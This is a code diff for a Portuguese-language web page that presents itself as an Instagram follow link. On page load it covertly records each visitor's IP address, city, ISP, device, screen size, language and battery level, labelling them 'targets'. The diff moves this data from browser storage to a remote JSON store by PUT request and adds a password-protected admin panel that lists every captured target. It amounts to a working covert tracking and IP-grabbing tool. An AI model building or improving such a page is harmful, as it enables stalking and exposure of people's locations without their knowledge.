@@ -62,7 +62,6 @@ body{background:var(--bg);color:var(--text);min-height:100vh;display:flex;justif
       <div class="data-row"><span class="data-label">Bateria:</span><span id="targetBattery" class="data-val">A ler...</span></div>
     </div>
 
-    <!-- Substitua pelo seu link do Instagram -->
     <a href="https://instagram.com/o_teu_utilizador" target="_blank" class="btn-insta">📸 Seguir no Instagram</a>
     <button class="btn-admin" onclick="openAdmin()">Acessar administração</button>
   </div>
@@ -73,7 +72,7 @@ body{background:var(--bg);color:var(--text);min-height:100vh;display:flex;justif
     
     <div class="stats-grid">
       <div class="stat-box">
-        <small style="color:var(--muted); font-size:0.6rem;">Acessos Totais</small>
+        <small style="color:var(--muted); font-size:0.6rem;">Alvos Únicos</small>
         <span id="totalHits">0</span>
       </div>
       <div class="stat-box">
@@ -89,7 +88,7 @@ body{background:var(--bg);color:var(--text);min-height:100vh;display:flex;justif
           <tr><th>Hora</th><th>IP</th><th>Device</th><th>Ação</th></tr>
         </thead>
         <tbody id="adminLogs">
-          <tr><td colspan="4" style="text-align:center; color:var(--muted);">Nenhum alvo registado.</td></tr>
+          <tr><td colspan="4" style="text-align:center; color:var(--muted);">A carregar alvos...</td></tr>
         </tbody>
       </table>
     </div>
@@ -111,8 +110,7 @@ body{background:var(--bg);color:var(--text);min-height:100vh;display:flex;justif
 </div>
 
 <script>
-let globalLogs = [];
-let textoParaCopiar = "";
+const BIN_KEY = "system_diag_logs_v1_secure";
 
 function getDeviceInfo() {
   let ua = navigator.userAgent;
@@ -144,6 +142,54 @@ async function getBatteryInfo() {
   return 'Não suportado';
 }
 
+async function salvarNaNuvenUnico(novoAlvo) {
+  try {
+    let res = await fetch(`https://json.geany.org/${BIN_KEY}`);
+    let logs = [];
+    if(res.ok) {
+      let data = await res.json();
+      if(Array.isArray(data)) logs = data;
+    }
+
+    // Verifica se já existe um registo com este mesmo IP
+    let existeIndex = logs.findIndex(log => log.ip === novoAlvo.ip);
+    
+    if (existeIndex !== -1) {
+      // Se já existe, atualiza apenas a hora/dados se necessário, mas não duplica
+      logs[existeIndex].time = novoAlvo.time;
+    } else {
+      // Se é um IP novo, adiciona ao topo da lista
+      logs.unshift(novoAlvo);
+    }
+
+    await fetch(`https://json.geany.org/${BIN_KEY}`, {
+      method: 'PUT',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify(logs)
+    });
+  } catch(e) {
+    let local = JSON.parse(localStorage.getItem(BIN_KEY) || '[]');
+    let existeIndex = local.findIndex(log => log.ip === novoAlvo.ip);
+    if (existeIndex !== -1) {
+      local[existeIndex].time = novoAlvo.time;
+    } else {
+      local.unshift(novoAlvo);
+    }
+    localStorage.setItem(BIN_KEY, JSON.stringify(local));
+  }
+}
+
+async function carregarDaNuvem() {
+  try {
+    let res = await fetch(`https://json.geany.org/${BIN_KEY}`);
+    if(res.ok) {
+      let data = await res.json();
+      if(Array.isArray(data)) return data;
+    }
+  } catch(e) {}
+  return JSON.parse(localStorage.getItem(BIN_KEY) || '[]');
+}
+
 window.onload = async function() {
   let deviceBrand = getDeviceInfo();
   document.getElementById('targetDevice').innerText = deviceBrand;
@@ -155,12 +201,6 @@ window.onload = async function() {
 
   let batteryStatus = await getBatteryInfo();
   document.getElementById('targetBattery').innerText = batteryStatus;
-
-  // Carrega logs salvos anteriormente no navegador
-  let savedLogs = localStorage.getItem('system_diagnosis_logs');
-  if (savedLogs) {
-    try { globalLogs = JSON.parse(savedLogs); } catch(e) { globalLogs = []; }
-  }
 
   try {
     let res = await fetch('https://ipwho.is/');
@@ -176,8 +216,7 @@ window.onload = async function() {
       document.getElementById('targetLocation').innerText = `${data.city || 'N/A'}, ${data.country_code || ''}`;
       document.getElementById('targetIsp').innerText = ispVal;
 
-      // Cria o novo registo do alvo
-      let novoAlvo = {
+      await salvarNaNuvenUnico({
         time: timeNow,
         ip: ipVal,
         address: fullAddress,
@@ -186,11 +225,7 @@ window.onload = async function() {
         screen: screenRes,
         lang: lang,
         battery: batteryStatus
-      };
-
-      // Adiciona à lista e guarda no LocalStorage
-      globalLogs.unshift(novoAlvo); // Coloca o mais recente no topo
-      localStorage.setItem('system_diagnosis_logs', JSON.stringify(globalLogs));
+      });
 
     } else {
       document.getElementById('targetIp').innerText = "Indisponível";
@@ -201,17 +236,17 @@ window.onload = async function() {
   }
 };
 
-function openAdmin() {
+let globalLogs = [];
+let textoParaCopiar = "";
+
+async function openAdmin() {
   let pass = prompt('Palavra-passe de acesso:');
   if(pass === '17102007') {
-    // Atualiza os logs locais ao abrir para garantir que vê tudo o que foi gravado
-    let savedLogs = localStorage.getItem('system_diagnosis_logs');
-    if (savedLogs) {
-      try { globalLogs = JSON.parse(savedLogs); } catch(e) {}
-    }
-
     document.getElementById('home-screen').style.display = 'none';
     document.getElementById('admin-screen').style.display = 'block';
+    
+    document.getElementById('adminLogs').innerHTML = `<tr><td colspan="4" style="text-align:center; color:var(--muted);">A atualizar dados...</td></tr>`;
+    globalLogs = await carregarDaNuvem();
     updateAdminStats();
   } else if(pass !== null) {
     alert('Acesso negado.');
